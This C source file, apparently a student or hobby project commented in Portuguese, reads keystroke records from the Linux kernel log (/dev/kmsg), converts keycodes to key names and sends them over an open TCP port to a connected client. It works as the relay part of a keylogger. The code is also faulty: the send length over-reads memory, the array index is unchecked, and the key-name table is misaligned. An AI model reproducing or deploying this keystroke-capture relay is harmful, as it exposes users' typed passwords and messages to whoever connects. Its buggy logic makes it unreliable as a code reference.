#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>

#define BUFFER_SIZE 1024
#define SERVER_PORT 1234

// #define KEY_RESERVED		    0
// #define KEY_ESC			        1
// #define KEY_1			        2
// #define KEY_2			        3
// #define KEY_3			        4
// #define KEY_4			        5
// #define KEY_5			        6
// #define KEY_6			        7
// #define KEY_7			        8
// #define KEY_8			        9
// #define KEY_9                   10
// #define KEY_0                   11
// #define KEY_MINUS		        12
// #define KEY_EQUAL		        13
// #define KEY_BACKSPACE		    14    
// #define KEY_TAB                 15
// #define KEY_Q                   16
// #define KEY_W                   17
// #define KEY_E                   18
// #define KEY_R                   19
// #define KEY_T                   20
// #define KEY_Y                   21
// #define KEY_U                   22
// #define KEY_I                   23
// #define KEY_O                   24
// #define KEY_P                   25
// #define KEY_LEFTBRACE           26
// #define KEY_RIGHTBRACE          27
// #define KEY_ENTER               28
// #define KEY_LEFTCTRL            29
// #define KEY_A                   30
// #define KEY_S                   31
// #define KEY_D                   32
// #define KEY_F                   33
// #define KEY_G                   34
// #define KEY_H                   35
// #define KEY_J                   36
// #define KEY_K                   37
// #define KEY_L                   38
// #define KEY_SEMICOLON           39
// #define KEY_APOSTROPHE          40
// #define KEY_GRAVE               41
// #define KEY_LEFTSHIFT           42
// #define KEY_BACKSLASH		    43
// #define KEY_Z                   44
// #define KEY_X                   45
// #define KEY_C                   46
// #define KEY_V                   47
// #define KEY_B                   48
// #define KEY_N                   49
// #define KEY_M                   50
// #define KEY_COMMA		        51
// #define KEY_DOT                 52
// #define KEY_SLASH		        53
// #define KEY_RIGHTSHIFT		    54
// #define KEY_KPASTERISK		    55
// #define KEY_LEFTALT		        56
// #define KEY_SPACE	        	57
// #define KEY_CAPSLOCK	    	58
// #define KEY_F1                  59
// #define KEY_F2                  60
// #define KEY_F3                  61
// #define KEY_F4                  62
// #define KEY_F5                  63
// #define KEY_F6                  64
// #define KEY_F7                  65
// #define KEY_F8                  66
// #define KEY_F9                  67
// #define KEY_F10                 68
// #define KEY_NUMLOCK		        69
// #define KEY_SCROLLLOCK		    70
// #define KEY_KP7                 71
// #define KEY_KP8                 72
// #define KEY_KP9                 73
// #define KEY_KPMINUS		        74
// #define KEY_KP4                 75
// #define KEY_KP5                 76
// #define KEY_KP6                 77
// #define KEY_KPPLUS		        78
// #define KEY_KP1                 79
// #define KEY_KP2                 80
// #define KEY_KP3                 81
// #define KEY_KP0                 82
// #define KEY_KPDOT		        83

// #define KEY_ZENKAKUHANKAKU	    85
// #define KEY_102ND		        86
// #define KEY_F11                 87
// #define KEY_F12                 88
// #define KEY_RO                  89
// #define KEY_KATAKANA            90
// #define KEY_HIRAGANA            91
// #define KEY_HENKAN              92
// #define KEY_KATAKANAHIRAGANA	93
// #define KEY_MUHENKAN            94
// #define KEY_KPJPCOMMA           95
// #define KEY_KPENTER             96
// #define KEY_RIGHTCTRL           97
// #define KEY_KPSLASH             98
// #define KEY_SYSRQ               99
// #define KEY_RIGHTALT            100
// #define KEY_LINEFEED            101
// #define KEY_HOME                102
// #define KEY_UP                  103
// #define KEY_PAGEUP              104
// #define KEY_LEFT                105
// #define KEY_RIGHT               106
// #define KEY_END                 107
// #define KEY_DOWN                108
// #define KEY_PAGEDOWN            109
// #define KEY_INSERT              110
// #define KEY_DELETE              111
// #define KEY_MACRO               112
// #define KEY_MUTE                113
// #define KEY_VOLUMEDOWN          114
// #define KEY_VOLUMEUP            115
// #define KEY_POWER               116	/* SC System Power Down */
// #define KEY_KPEQUAL             117
// #define KEY_KPPLUSMINUS         118
// #define KEY_PAUSE		        119
// #define KEY_SCALE		        120	/* AL Compiz Scale (Expose) */

// #define KEY_KPCOMMA		        121
// #define KEY_HANGEUL		        122
// #define KEY_HANGUEL		        KEY_HANGEUL
// #define KEY_HANJA		        123
// #define KEY_YEN                 124
// #define KEY_LEFTMETA		    125
// #define KEY_RIGHTMETA		    126
// #define KEY_COMPOSE		        127

#define NUM_TECLAS 128
const char* teclas[NUM_TECLAS] = {
    "Reservado",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "Menos",
    "Igual",
    "Backspace",
    "Tab",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "Abre Colchete",
    "Fecha Colchete",
    "Enter",
    "Left Ctrl",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "Ponto e Virgula",
    "Acento Agudo",
    "Aspa simples (')",
    "Left Shift",
    "Barra Invertida",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "Virgula",
    "Ponto",
    "Barra",
    "Right Shift",
    "Multiplicacao",
    "Left Alt",
    "Espaco",
    "Caps Lock",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "Num Lock",
    "Scroll Lock",
    "Tecla 7 (Num Pad)",
    "Tecla 8 (Num Pad)",
    "Tecla 9 (Num Pad)",
    "Subtracao (Num Pad)",
    "Tecla 4 (Num Pad)",
    "Tecla 5 (Num Pad)",
    "Tecla 6 (Num Pad)",
    "Soma (Num Pad)",
    "Tecla 1 (Num Pad)",
    "Tecla 2 (Num Pad)",
    "Tecla 3 (Num Pad)",
    "Tecla 0 (Num Pad)",
    "Ponto Decimal (Num Pad)",
    "Zenkaku/Hankaku",
    "102nd",
    "Contra barra ('\')",
    "F11",
    "F12",
    "Barra (/)",
    "Hiragana",
    "Henkan",
    "Katakana/Hiragana",
    "Muhenkan",
    "Virgula (Num Pad)",
    "Enter (Num Pad)",
    "Enter (Num Pad)",
    "Barra (Num Pad)",
    "Barra (Num Pad)",
    "Print Screen",
    "Alt Gr",
    "NULL",
    "Home",
    "Seta para Cima",
    "Page UP",
    "Seta para Esquerda",
    "Seta para Direita",
    "End",
    "Seta para Baixo",
    "Page Down",
    "NULL",
    "Macro",
    "Delete",
    "Volume Down",
    "Volume Up",
    "Power",
    "Igual (Num Pad)",
    "Mais/Menos (Num Pad)",
    "Pause",
    "Escala",
    "Virgula (Num Pad)",
    "Hangeul",
    "Hanja",
    "Yen",
    "Left Meta",
    "Comand (botao Windows)",
    "Compose"
};


void shiftStringByCount(char* string, int count) {
    if (count >= 0 && count < strlen(string)) {
        memmove(string, string + count, strlen(string) - count + 1);
    } else {
        string[0] = '\0';
    }
}

int findSemicolon(const char* string) {
    int position = -1;  // Default return value if semicolon is not found
    int i = 0;

    while (string[i] != '\0') {
        if (string[i] == ';') {
            position = i;
            break;
        }
        i++;
    }

    return position + 20;    //Retorna a posição do ; + caracteres do termo "Tecla pressionada: "
}

int main() {
    int fd;
    int sockfd, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len;
    fd_set fds;
    struct timeval timeout;

    // Abrir o arquivo /dev/kmsg
    fd = open("/dev/kmsg", O_RDONLY);
    if (fd < 0) {
        perror("Erro ao abrir o arquivo /dev/kmsg");
        exit(1);
    }

    // Cria o socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("Erro ao criar o socket");
        exit(1);
    }

    // Configura os detalhes do servidor
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    // Associa o socket ao endereço e porta
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Erro ao fazer o bind");
        exit(1);
    }

    // Aguarda por conexões
    if (listen(sockfd, 1) == -1) {
        perror("Erro ao ouvir por conexões");
        exit(1);
    }

    printf("Servidor aguardando por conexões...\n");

    // Aceita a conexão do cliente
    client_addr_len = sizeof(client_addr);
    client_sock = accept(sockfd, (struct sockaddr *)&client_addr, &client_addr_len);
    if (client_sock == -1) {
        perror("Erro ao aceitar a conexão");
        exit(1);
    }

    printf("Cliente conectado!\n");

    off_t startPos = lseek(fd, 0, SEEK_END);  // Salvar a posição atual do arquivo

    while (1) {
        // Limpar o conjunto de descritores de arquivo
        FD_ZERO(&fds);
        FD_SET(fd, &fds);

        // Definir o tempo limite para 1 segundo
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        // Aguardar até que haja dados disponíveis para leitura
        if (select(fd + 1, &fds, NULL, NULL, &timeout) > 0) {
            // Verificar se o descritor de arquivo está pronto para leitura
            if (FD_ISSET(fd, &fds)) {
                char buffer[BUFFER_SIZE];
                ssize_t bytesRead;

                // Ler os dados do arquivo a partir da posição anterior
                bytesRead = read(fd, buffer, sizeof(buffer) - 1);
                if (bytesRead < 0) {
                    perror("Erro ao ler o arquivo /dev/kmsg");
                    exit(1);
                }

                if (bytesRead > 0) {
                    // Adicionar um terminador de string no final dos dados lidos
                    buffer[bytesRead] = '\0';

                    // Imprimir os dados lidos
                    printf("%s", buffer);

                    // Enviar dados para o cliente
                    int start = findSemicolon(buffer);
                    shiftStringByCount(buffer, start);
                    if (send(client_sock, teclas[atoi(buffer)], bytesRead, 0) == -1) {
                        perror("Erro ao enviar dados para o cliente");
                        exit(1);
                    }

                    // Atualizar a posição anterior para o final do arquivo
                    startPos = lseek(fd, 0, SEEK_CUR);
                }
            }
        }

        // Atualizar a posição atual para o final do arquivo
        startPos = lseek(fd, 0, SEEK_CUR);
    }

    // Fechar o descritor de arquivo
    close(fd);

    // Fecha a conexão com o cliente
    close(client_sock);

    // Fecha o socket do servidor
    close(sockfd);

    return 0;
}